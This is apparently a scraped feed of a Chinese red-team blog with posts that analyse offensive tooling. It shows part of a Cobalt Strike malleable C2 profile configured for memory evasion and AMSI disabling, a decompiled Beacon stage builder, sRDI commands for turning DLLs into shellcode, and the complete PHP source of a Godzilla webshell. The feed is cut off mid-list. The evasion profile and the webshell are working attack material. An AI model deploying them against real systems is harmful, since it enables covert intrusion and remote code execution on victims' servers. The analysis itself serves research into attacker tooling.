ssh_banner &quot;Cobalt Strike 4.2&quot;;set tcp_frame_header &quot;&quot;;set tcp_port &quot;4444&quot;;# Defaults for ALL CS set server responseshttp-config {    set headers &quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;;    header &quot;Server&quot; &quot;Apache&quot;;    header &quot;Keep-Alive&quot;&quot;timeout=5, max=100&quot;;    header &quot;Connection&quot;&quot;Keep-Alive&quot;;#   The set trust_x_forwarded_foroption decides if Cobalt Strike uses the# X-Forwarded-For set header to determine the remote address of a request.# Use this option if your Cobalt Strike server is behind an set redirector        set trust_x_forwarded_for &quot;true&quot;;}https-certificate {    set C &quot;US&quot;; #Country    set CN &quot;localhost&quot;; # CN - you will probably nver use this, but don&#39;t leave at localost    set L &quot;San Francisco&quot;; #Locality    set OU &quot;IT Services&quot;; #Org unit    set O &quot;FooCorp&quot;; #Org name    set ST &quot;CA&quot;; #State    set validity &quot;365&quot;;    # if using a valid vert, specify this, keystore = java keystore    #set keystore &quot;domain.store&quot;;    #set password &quot;mypassword&quot;;}#If you have code signing cert:#code-signer {#    set keystore &quot;keystore.jks&quot;;#    set password &quot;password&quot;;#    set alias    &quot;server&quot;;#    set timestamp &quot;false&quot;;#    set timestamp_url &quot;set://timestamp.digicert.com&quot;;#}#Stager is only supported as a GET request and it will use AFAICT the IE on Windows.http-stager {    set uri_x86 &quot;/api/v1/GetLicence&quot;;         set uri_x64 &quot;/api/v2/GetLicence&quot;;    client {        parameter &quot;uuid&quot; &quot;96c5f1e1-067b-492e-a38b-4f6290369121&quot;;        #header &quot;headername&quot; &quot;headervalue&quot;;    }    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;            header &quot;Content-Encoding&quot; &quot;gzip&quot;;            output {                    #GZIP headers and footers            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;            #AFAICT print is the only supported terminator            print;        }    }}#This is used only in http-get and http-post and not during stageset useragent &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;# define indicators for an set GEThttp-get {    # we require a stub URI to attach the rest of our data to.    set uri &quot;/api/v1/Updates&quot;;    client {        header &quot;Accept-Encoding&quot; &quot;deflate, gzip;q=1.0, *;q=0.5&quot;;        # mask our metadata, base64 encode it, store it in the URI        metadata {            # XOR encode the value            mask;            # URL-safe Base64 Encode            #base64url;            # URL-safe Base64 Encode            base64;            # NetBIOS Encode ‘a’ ?            #netbios;            #NetBIOS Encode ‘A’            #netbiosu;            # You probably want these to be last two, else you will encode these values            # Append a string to metadata            append &quot;;&quot; ;            # Prepend a string            prepend &quot;SESSION=&quot;;            # Terminator statements - these say where the metadata goes            # Pick one            # Append to URI            #uri-append;            #Set in a header            header &quot;Cookie&quot;;            #Send data as transaction body            #print            #Store data in a URI parameter            #parameter &quot;someparam&quot;        }    }    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        # prepend some text in case the GET is empty.        output {            mask;            base64;            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;                        print;        }    }}# define indicators for an set POSThttp-post {    set uri &quot;/api/v1/Telemetry/Id/&quot;;    set verb &quot;POST&quot;;    client {        # make it look like we&#39;re posting something cool.        header &quot;Content-Type&quot; &quot;application/json&quot;;        header &quot;Accept-Encoding&quot; &quot;deflate, gzip;q=1.0, *;q=0.5&quot;;        # ugh, our data has to go somewhere!        output {            mask;            base64url;            uri-append;        }        # randomize and post our session ID        id {            mask;            base64url;            prepend &quot;{version: 1, d=\x22&quot;;                        append &quot;\x22}\n&quot;;            print;        }    }    # The server&#39;s response to our set POST    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        # post usually sends nothing, so let&#39;s prepend a string, mask it, and        # base64 encode it. We&#39;ll get something different back each time.        output {            mask;            base64;            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;                        print;        }    }}stage {#    The transform-x86 and transform-x64 blocks pad and transform Beacon’s# Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.    transform-x86 {        prepend &quot;\x90\x90&quot;;        strrep &quot;ReflectiveLoader&quot; &quot;DoLegitStuff&quot;;    }    transform-x64 {        # transform the x64 rDLL stage, same options as with    }    stringw &quot;I am not Beacon&quot;;    set cleanup &quot;true&quot;;        # Ask Beacon to attempt to free memory associated with                                # the Reflective DLL package that initialized it.    # Override the first bytes (MZ header included) of Beacon&#39;s Reflective DLL.    # Valid x86 instructions are required. Follow instructions that change    # CPU state with instructions that undo the change.#    set magic_mz_x86 &quot;MZRE&quot;;#    set magic_mz_x86 &quot;MZAR&quot;;    # Ask the x86 ReflectiveLoader to load the specified library and overwrite    #  its space instead of allocating memory with VirtualAlloc.    # Only works with VirtualAlloc    #set module_x86 &quot;xpsservices.dll&quot;;    #set module_x64 &quot;xpsservices.dll&quot;;    # Obfuscate the Reflective DLL’s import table, overwrite unused header content,    # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.    set obfuscate &quot;false&quot;;    # Obfuscate Beacon, in-memory, prior to sleeping    set sleep_mask &quot;true&quot;;    # Use embedded function pointer hints to bootstrap Beacon agent without    # walking kernel32 EAT    set smartinject &quot;true&quot;;    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after    # it loads Beacon payload    set stomppe &quot;true&quot;;    # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory    set userwx &quot;false&quot;;#    set image_size_x86 &quot;512000&quot;;#    set image_size_x64 &quot;512000&quot;;    set entry_point &quot;92145&quot;;    #The Exported name of the Beacon DLL    #set name &quot;beacon.x64.dll&quot;    #set rich_header  # I don&#39;t understand this yet TODO: fixme    #TODO: add examples process-inject}process-inject {        # set how memory is allocated in a remote process        # VirtualAllocEx or NtMapViewOfSection. The        # NtMapViewOfSection option is for same-architecture injection only.        # VirtualAllocEx is always used for cross-arch memory allocations.        set allocator &quot;VirtualAllocEx&quot;;        # shape the memory characteristics and content        set min_alloc &quot;16384&quot;;        set startrwx &quot;true&quot;;        set userwx &quot;false&quot;;        transform-x86 {        prepend &quot;\x90\x90&quot;;        }        transform-x64 {        # transform x64 injected content        }        # determine how to execute the injected code        execute {            CreateThread &quot;ntdll.dll!RtlUserThreadStart&quot;;            SetThreadContext;            RtlCreateUserThread;        }}post-ex {    # control the temporary process we spawn to    set spawnto_x86 &quot;%windir%\\syswow64\\WerFault.exe&quot;;    set spawnto_x64 &quot;%windir%\\sysnative\\WerFault.exe&quot;;    # change the permissions and content of our post-ex DLLs    set obfuscate &quot;true&quot;;    # pass key function pointers from Beacon to its child jobs    set smartinject &quot;true&quot;;    # disable AMSI in powerpick, execute-assembly, and psinject    set amsi_disable &quot;true&quot;;    #The thread_hint option allows multi-threaded post-ex DLLs to spawn    # threads with a spoofed start address. Specify the thread hint as    # “module!function+0x##” to specify the start address to spoof.    # The optional 0x## part is an offset added to the start address.    # set thread_hint &quot;....TODO:FIXME&quot;}</code></pre><p>根据wx公众号的文章结尾所描述<br><img src="https://z3.ax1x.com/2021/09/11/hz6zpq.png" alt=""></p><p>经过测试确实如此<br><img src="https://z3.ax1x.com/2021/09/11/hzc9XT.png" alt=""></p><p>processhacker Memory所定位看到的内存是xor过的，MZ头也没了<br><img src="https://z3.ax1x.com/2021/09/11/hzcEN9.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/11/hzcm1x.png" alt=""></p><p>还是能检测出来<br><img src="https://z3.ax1x.com/2021/09/11/hzcujK.png" alt=""></p><p>看到的文章中还有一篇是Hook SleepEx函数，然后进行修改 （由于个人过于垃圾无法复现该文章）<br><a href="https://www.arashparsa.com/hook-heaps-and-live-free/" target="_blank" rel="noopener">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p><p>最后就是跟着公众号文章分析了一下cs beacon生成的过程 （详细分析请看wx公众号的文章</p><pre><code>BeaconConfig的生成在 BeaconPayload类的 exportBeaconStage函数中</code></pre><p><img src="https://z3.ax1x.com/2021/09/11/hzcY9I.png" alt=""></p><p>exportBeaconStage</p><pre><code>    protected byte[] exportBeaconStage(int paramInt, String paramString1, boolean paramBoolean1, boolean paramBoolean2, String paramString2)  {    try    {      long l1 = System.currentTimeMillis(); //返回当前世界时间(毫秒)      byte[] arrayOfByte1 = SleevedResource.readResource(paramString2); //读取对应的dll并解密数据      if (paramString1.length() &gt; 254) { //如果长度大于254则只读取0~254        paramString1 = paramString1.substring(0, 254);      }      String[] arrayOfString1 = this.c2profile.getString(&quot;.http-get.uri&quot;).split(&quot; &quot;); //get请求的路径读取      String[] arrayOfString2 = paramString1.split(&quot;,\\s*&quot;); //字符串分割      LinkedList localLinkedList = new LinkedList();      for (int i = 0; i &lt; arrayOfString2.length; i++) //遍历数据添加到localLinkedList      {        localLinkedList.add(arrayOfString2[i]);        localLinkedList.add(CommonUtils.pick(arrayOfString1));      }      while ((localLinkedList.size() &gt; 2) &amp;&amp; (CommonUtils.join(localLinkedList, &quot;,&quot;).length() &gt; 255))      {        str1 = localLinkedList.removeLast() + &quot;&quot;;        String str2 = localLinkedList.removeLast() + &quot;&quot;;        CommonUtils.print_info(&quot;dropping &quot; + str2 + str1 + &quot; from Beacon profile for size&quot;);      }      String str1 = randua(this.c2profile);      int j = Integer.parseInt(this.c2profile.getString(&quot;.sleeptime&quot;)); //c2profile延时时间读取      String str3 = CommonUtils.pick(this.c2profile.getString(&quot;.http-post.uri&quot;).split(&quot; &quot;)); //post请求的路径      byte[] arrayOfByte2 = this.c2profile.recover_binary(&quot;.http-get.server.output&quot;);//server头返回      byte[] arrayOfByte3 = this.c2profile.apply_binary(&quot;.http-get.client&quot;);//client请求      byte[] arrayOfByte4 = this.c2profile.apply_binary(&quot;.http-post.client&quot;);//post client请求      int k = this.c2profile.size(&quot;.http-get.server.output&quot;, 1048576); //get请求返回      int m = Integer.parseInt(this.c2profile.getString(&quot;.jitter&quot;));      if ((m &lt; 0) || (m &gt; 99)) {        m = 0;      }      int n = Integer.parseInt(this.c2profile.getString(&quot;.maxdns&quot;));      if ((n &lt; 0) || (n &gt; 255)) {        n = 255;      }      int i1 = 0;      if (paramBoolean1) {        i1 |= 0x1;      }      if (paramBoolean2) {        i1 |= 0x8;      }      long l2 = CommonUtils.ipToLong(this.c2profile.getString(&quot;.dns_idle&quot;));      int i2 = Integer.parseInt(this.c2profile.getString(&quot;.dns_sleep&quot;)); //dns延迟读取      Settings localSettings = new Settings(); //beacon配置      localSettings.addShort(1, i1);      localSettings.addShort(2, paramInt);      localSettings.addInt(3, j);      localSettings.addInt(4, k);      localSettings.addShort(5, m);      localSettings.addShort(6, n);      localSettings.addData(7, this.publickey, 256);      localSettings.addString(8, CommonUtils.join(localLinkedList, &quot;,&quot;), 256);      localSettings.addString(9, str1, 128);      localSettings.addString(10, str3, 64);      localSettings.addData(11, arrayOfByte2, 256);      localSettings.addData(12, arrayOfByte3, 256);      localSettings.addData(13, arrayOfByte4, 256);      localSettings.addData(14, CommonUtils.asBinary(this.c2profile.getString(&quot;.spawnto&quot;)), 16);      localSettings.addString(29, this.c2profile.getString(&quot;.post-ex.spawnto_x86&quot;), 64);      localSettings.addString(30, this.c2profile.getString(&quot;.post-ex.spawnto_x64&quot;), 64);      localSettings.addString(15, &quot;&quot;, 128);      localSettings.addShort(31, QuickSecurity.getCryptoScheme());      localSettings.addInt(19, (int)l2);      localSettings.addInt(20, i2);      localSettings.addString(26, this.c2profile.getString(&quot;.http-get.verb&quot;), 16);      localSettings.addString(27, this.c2profile.getString(&quot;.http-post.verb&quot;), 16);      localSettings.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);      localSettings.addInt(37, this.c2profile.getInt(&quot;.watermark&quot;));      localSettings.addShort(38, this.c2profile.option(&quot;.stage.cleanup&quot;) ? 1 : 0);      localSettings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);      String str4 = this.listener.getHostHeader();      if ((str4 == null) || (str4.length() == 0)) {        localSettings.addString(54, &quot;&quot;, 128);      } else if (Profile.usesHostBeacon(this.c2profile)) {        localSettings.addString(54, &quot;&quot;, 128);      } else {        localSettings.addString(54, &quot;Host: &quot; + this.listener.getHostHeader() + &quot;\r\n&quot;, 128);      }      if (Profile.usesCookieBeacon(this.c2profile)) {        localSettings.addShort(50, 1);      } else {        localSettings.addShort(50, 0);      }      ProxyServer localProxyServer = ProxyServer.parse(this.listener.getProxyString()); //代理      localProxyServer.setup(localSettings);      setupPivotFrames(this.c2profile, localSettings);      setupKillDate(localSettings);      setupGargle(localSettings, paramString2);      new ProcessInject(this.c2profile).apply(localSettings);      byte[] arrayOfByte5 = localSettings.toPatch();      arrayOfByte5 = beacon_obfuscate(arrayOfByte5); //xor      String str5 = CommonUtils.bString(arrayOfByte1);      int i3 = str5.indexOf(&quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;);      str5 = CommonUtils.replaceAt(str5, CommonUtils.bString(arrayOfByte5), i3);      return CommonUtils.toBytes(str5);    }    catch (IOException localIOException)    {      MudgeSanity.logException(&quot;export Beacon stage: &quot; + paramString2, localIOException, false);    }    return new byte[0];  }</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://adamsvoboda.net/sleeping-with-a-mask-on-cobal</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>DLL转shellcode研究</title>
    <link href="http://422926799.github.io/posts/8f26af05.html"/>
    <id>http://422926799.github.io/posts/8f26af05.html</id>
    <published>2021-09-09T09:18:53.000Z</published>
    <updated>2021-09-09T09:41:31.391Z</updated>
    
    <content type="html"><![CDATA[<p>昨天重新看到了dll转shellcode的文章想分析一下原理，所以<br>有了这篇文章。</p><h2 id="实现DLL加载两个方法"><a href="#实现DLL加载两个方法" class="headerlink" title="实现DLL加载两个方法"></a>实现DLL加载两个方法</h2><p>1.从DIRECTORY_ENTRY_EXPORT寻找ReflectiveLoader函数，修补之后利用该函数加载DLL<br>2.实现一段LoadPE的shellcode，DLL跟在后面</p><h2 id="DLL加载原理"><a href="#DLL加载原理" class="headerlink" title="DLL加载原理"></a>DLL加载原理</h2><blockquote><p>启动一个可执行模块的时候,操作系统的加载程序会先为进程创建虚拟地址空间,接着把可执行模块映射到进程的地址空间中.之后加载程序会检查可执行模块的导入段, 试图对所需的DLL进行定位并将它们映射到进程的地址空间中. 由于导入段只包含DLL的名称,不包含DLL的路径,因此加载程序必须在用户的磁盘上搜索DLL. 下面是加载程序的搜索顺序: (1) 包含可执行文件的目录; (2) Windows的系统目录; GetSystemDirctory (3) 16位的系统目录, 即Windows/System (4) Windows目录 GetWindowsDirectory (5) 进程的当前目录; (6) PATH 环境变量中所列出的目录;</p></blockquote><h2 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h2><p><a href="https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1" target="_blank" rel="noopener">https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1</a></p><pre><code class="powershell">import-module \.ConvertTo-Shellcode.ps1$c=ConvertTo-Shellcode .\test.dll$d=$c |%{write-output ([system.string]::format(&#39;{0:X2}&#39;,$_))}$d -join &quot;&quot; | Out-File shellcode.txt</code></pre><p>得到shellcode.txt py转换一下直接执行shellcode或者把得到的十六进制用010editor十六进制写入到某文件嵌套到资源里读取执行<br><img src="https://z3.ax1x.com/2021/09/09/hL2CM4.png" alt=""></p><p>shellcode执行测试<br><img src="https://z3.ax1x.com/2021/09/09/hL28ot.png" alt=""></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>它的原理是在不改变MZ标志的情况下把整个dll文件修补成可被当作shellcode加载的格式，具体的操作为在dll内导出自加载函数(ReflectiveLoader)然后讲MZ头起始字节修改成执行ReflectiveLoader函数的硬编码</p><p>WBG的描述:</p><blockquote><p>其实所谓的修补反射dll其实就是修改dll头部让其变成汇编指令去调用ReflectiveLoader函数然后ReflectiveLoader函数会经过一系列处理最后会调用DllMain。这时这个dll就像shellcode一样可以直接执行，其实我们所做的就是解析dll找到ReflectiveLoader函数并将其地址硬编码写到Dll头部然后call</p></blockquote><p>自己实现具体过程：</p><ol><li>定位DLL文件在内存中的基址</li><li>获取所需的系统API</li><li>分配一片用来装载DLL的空间</li><li>复制PE文件头和各个节</li><li>处理DLL的引入表</li><li>对DLL进行重定位</li><li>调用DLL入口点</li></ol><p>目前网上的版本有两种：</p><pre><code>* 带解压缩的版本：先把dll压缩然后在构造一段解压数据的C编译后提取ASM，然后将DLL拼接到后面 -&gt;看雪那个就是这样* 不带压缩版本：直接修补，去掉MZ头</code></pre><p>两个版本的都看了分析一下<br>带压缩版本的：利用RtlGetCompressionWorkSpaceSize和RtlCompressBuffer实现数据压缩，然后修补DLL<br><img src="https://z3.ax1x.com/2021/09/09/hLRQpT.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLRbEn.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLRvgU.png" alt=""></p><p>WBG版本的修补:</p><pre><code>* 从DIRECTORY_ENTRY_EXPORT寻找ReflectiveLoader函数，修补之后利用该函数加载DLL</code></pre><p><img src="https://z3.ax1x.com/2021/09/09/hLW3PP.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWtKg.png" alt=""></p><p>ConvertTo-Shellcode.py分析<br>-&gt;读取DLL数据，传入ConvertToShellcode() -&gt; 中间调用了一个HashFunctionName函数计算arguments.function_name<br><img src="https://z3.ax1x.com/2021/09/09/hLW05q.png" alt=""></p><p>HashFunction函数<br><img src="https://z3.ax1x.com/2021/09/09/hLWfaR.png" alt=""><br>（计算函数hash）<br><img src="https://z3.ax1x.com/2021/09/09/hLWIG6.png" alt=""></p><p>ConvertToShellcode函数<br>-&gt;判断DLL是否为64位<br>-&gt;根据对应的位数取LoadPE的shellcode<br>-&gt;bootstrap拼接对应的指令<br>-&gt;bootstrap + rdiShellcode + dllBytes + userData<br><img src="https://z3.ax1x.com/2021/09/09/hLWbse.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWXdA.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWzJP.png" alt=""></p><p>大概如下：</p><pre><code>call &lt;xxx&gt;pop eaxpush ebpmov ebp,espmov edx,eaxadd eax,&lt;DLL偏移量&gt;add edx,&lt;DLL偏移量&gt;+&lt;DLL大小&gt;push &lt;flags&gt;push 0push edxpush &lt;functionHash&gt;push eaxcall &lt;DLL&gt;add esp,0x14leaveret.............&lt;LOADPE_ShellCode&gt;.............&lt;DLLBytest&gt;</code></pre><p>指定dll生成bin，丢golink生成exe<br><img src="https://z3.ax1x.com/2021/09/09/hLfKQU.png" alt=""></p><p>入口点：<br><img src="https://z3.ax1x.com/2021/09/09/hLfYJx.png" alt=""></p><p>dword_401C04是DLL bytes<br><img src="https://z3.ax1x.com/2021/09/09/hLfaQO.png" alt=""></p><p>-&gt;从PEB里寻找ntdll.dll的LdrLoadDLL函数<br>-&gt;从PEB里寻找ntdll.dll的LdrGetProcAddress函数<br>-&gt;利用LdrLoadDLL加载Kernel32.dll<br>    -&gt;加载VirtuaLLoc函数<br>    -&gt;加载VirtualProtect函数<br>    -&gt;加载FlushInstructionCache函数<br>    -&gt;加载GetNativeSysteminfo函数<br>    -&gt;加载Sleep函数<br>    -&gt;加载RtlAddFunctionTable函数<br>    -&gt;加载LoadlibraryA函数<br>-&gt;判断对应的DLL函数是否加载成功<br>-&gt;DLL各个区段赋值变量<br>-&gt;调用GetNativeSystemInfo函数<br>-&gt;Virtualloc修改内存可读可写<br>-&gt;复制PE文件头和各个节<br>-&gt;处理DLL的引入表<br>-&gt;对DLL进行重定位<br>-&gt;调用FlushInstructionCache刷新内存<br>-&gt;加载DLLMain函数<br><img src="https://z3.ax1x.com/2021/09/09/hLfrTA.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf6Yt.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf2Sf.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf4mQ.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLfITs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLfHf0.png" alt=""></p><p>最后的启动顺序<br>（图片来源WBG）<br><img src="https://z3.ax1x.com/2021/09/09/hLfLlT.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接：<br><a href="https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/" target="_blank" rel="noopener">https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/</a><br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection" target="_blank" rel="noopener">https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection</a><br><a href="https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation" target="_blank" rel="noopener">https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation</a><br><a href="https://www.cnblogs.com/h2zZhou/p/7721797.html" target="_blank" rel="noopener">https://www.cnblogs.com/h2zZhou/p/7721797.html</a></p><p>现成工具:<br><a href="https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1" target="_blank" rel="noopener">https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1</a><br><a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a> - 划重点</p><p>WBG的项目:<br><a href="https://github.com/WBGlIl/ReflectiveDLL_Patch/blob/master/ReflectiveDLL_Patch.py" target="_blank" rel="noopener">https://github.com/WBGlIl/ReflectiveDLL_Patch/blob/master/ReflectiveDLL_Patch.py</a><br><a href="https://github.com/WBGlIl/go-ReflectiveDLL" target="_blank" rel="noopener">https://github.com/WBGlIl/go-ReflectiveDLL</a></p><p>看雪的项目:<a href="https://github.com/killeven/DllToShellCode/tree/master/DllToShellCode" target="_blank" rel="noopener">https://github.com/killeven/DllToShellCode/tree/master/DllToShellCode</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;昨天重新看到了dll转shellcode的文章想分析一下原理，所以&lt;br&gt;有了这篇文章。&lt;/p&gt;
&lt;h2 id=&quot;实现DLL加载两个方法&quot;&gt;&lt;a href=&quot;#实现DLL加载两个方法&quot; class=&quot;headerlink&quot; title=&quot;实现DLL加载两个方法&quot;&gt;&lt;/a&gt;实</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>哥斯拉实现meterpreter分析</title>
    <link href="http://422926799.github.io/posts/19caa6fb.html"/>
    <id>http://422926799.github.io/posts/19caa6fb.html</id>
    <published>2021-09-03T19:08:51.000Z</published>
    <updated>2021-09-03T19:15:22.777Z</updated>
    
    <content type="html"><![CDATA[<p>哥斯拉version:1.0<br>Cryption:PHP_XOR_BASE64<br>这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class</p><pre><code>* 先获取对于payload类型，然后从对应payload目录下读取反弹meterpreter的payload文件 （对应路径：plugins/&lt;scriptname&gt;/assets）* 调用对应payload里的include函数* include函数调用evalFunc，发送POST请求调用大马里的includeCode函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccpa8.png" alt=""></p><p>调用对应payload里的include函数<br><img src="https://z3.ax1x.com/2021/09/04/hcc9IS.png" alt=""></p><p>通过get函数获取到$parameter数组里对应的binCode和codeName的value，最后写在session里（将反弹meterprter的payload拼接写到存大马的session文件里）<br><img src="https://z3.ax1x.com/2021/09/04/hccPPg.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hcckxs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hccEMn.png" alt=""></p><p>抓包如下<br><img src="https://z3.ax1x.com/2021/09/04/hccVrq.png" alt=""></p><p>之后点击Go Button后触发GoButtonClick事件</p><pre><code>* 发送POST请求调用大马里对应的run函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccZq0.png" alt=""></p><p>Run函数</p><pre><code>* 获取传送过来的数据做好好下步划分的准备* 判断是否要进行bypass_open_basedir* 调用evalFunc函数执行反弹meterprter的code</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccmZV.png" alt=""></p><p>就是<code>eval($_SESSION[&quot;Meterpreter&quot;])</code><br><img src="https://z3.ax1x.com/2021/09/04/hccuIU.png" alt=""></p><p>抓包如下<br>第二个PHPSESSIONID对应<code>$_SESSION[&quot;meterpter&quot;]</code><br><img src="https://z3.ax1x.com/2021/09/04/hccMiF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/04/hccQG4.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;哥斯拉version:1.0&lt;br&gt;Cryption:PHP_XOR_BASE64&lt;br&gt;这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 先获取对于payload类型，然后从</summary>
      
    
    
    
    
    <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
    
  </entry>
  
  <entry>
    <title>哥斯拉整体过程刨析</title>
    <link href="http://422926799.github.io/posts/befc239e.html"/>
    <id>http://422926799.github.io/posts/befc239e.html</id>
    <published>2021-09-03T13:27:25.000Z</published>
    <updated>2021-09-03T19:05:54.125Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要是分析哥斯拉流量协议实现的过程</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>版本:v1.0<br>有效荷载:Phpdynxxxxx<br>加密器:php_xor_base64</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><pre><code class="php">&lt;?php    session_start();    @set_time_limit(0);    @error_reporting(0);    function E($D,$K){ //$D是base64解密后的数据,$K是key        for($i=0;$i&lt;strlen($D);$i++) {            $D[$i] = $D[$i]^$K[$i+1&amp;15]; //XOR解密数据        }        return $D;    }    function Q($D){        return base64_encode($D);    }    function O($D){        return base64_decode($D);    }    $P=&#39;pass&#39;;    $V=&#39;payload&#39;;    $T=&#39;3c6e0b8a9c15224a&#39;; //KEY    if (isset($_POST[$P])){ //检测密码字段是否存在POST请求        $F=O(E(O($_POST[$P]),$T)); //先base64解密数据，XOR运算解密数据，base64在解密xor解密后的数据        if (isset($_SESSION[$V])){ //检测SESSION是否存在 (对应SESSION 临时文件存放的shell)            $L=$_SESSION[$V]; //SESSION数据读取            $A=explode(&#39;|&#39;,$L); //分割|            class C{public function nvoke($p) {eval($p.&quot;&quot;);}} //执行命令            $R=new C();            $R-&gt;nvoke($A[0]); //调用nvoke函数            echo substr(md5($P.$T),0,16); //md5加密$p和$T，截断0到16位 （输出两次-&gt;开头&lt;data&gt;结尾）方便client提取返回内容            echo Q(E(@run($F),$T)); //输出结果            echo substr(md5($P.$T),16);        }else{            $_SESSION[$V]=$F;        }    }</code></pre><p>整体步骤如下：<br>1.一开始是没有session的，第一次把传过来的数据（大马）解密（base64_Decode-&gt;Xor_Decode-&gt;Base64_decode）写入到session，产生临时文件<br>    -&gt; Server返回带有session编号的cookie返回给client （ Example:Set-Cookie: PHPSESSID=064ef1kh9kjhmp9k46rvejh396; path=/）<br>    -&gt; Client接到带有PHPSESSID后，后续的请求都带上PHPSESSID<br>2.往后调用对应的功能pass字段就会调用对应大马里的函数</p><p>session产生的临时文件里的大马 （对应的脚本语言对应jar目录下的shells/payloads/<scriptname>/assets/）<br><img src="https://z3.ax1x.com/2021/09/03/hcEbUs.png" alt=""></scriptname></p><p>jeb反编译Godzilla.jar<br>定位到core/ui/component/dialog/ShellSetting.Class<br>在配置shell的时候步骤如下<br><img src="https://z3.ax1x.com/2021/09/03/hcEX80.png" alt=""></p><p>调用updateTempShellEntity更新模板对应的设置<br><img src="https://z3.ax1x.com/2021/09/03/hcVSrF.png" alt=""></p><p>initShellOpertion函数<br>(PayloadModel-&gt;对应你设置时选择的有效荷载，CryptModel-&gt;对应你设置时选择的加密器)</p><pre><code>* 返回http对象* 返回对应的payloadModel class对象* 返回对应的cryptModel class对象* 调用CryptModel.init函数* 调用payloadModel.init函数* 调用payloadModel.test函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hc6oVK.png" alt=""></p><p>getPayload函数<br><img src="https://z3.ax1x.com/2021/09/04/hc6bPe.png" alt=""></p><p>getCryption函数</p><p>这里加密器用的PhpXor对应shells/cryptions/phpXor/PhpXor.class<br>init函数</p><pre><code>* 返回http对象* 返回配置shell设置的密钥* 返回配置shell设置的密码* md5加密pass+key* 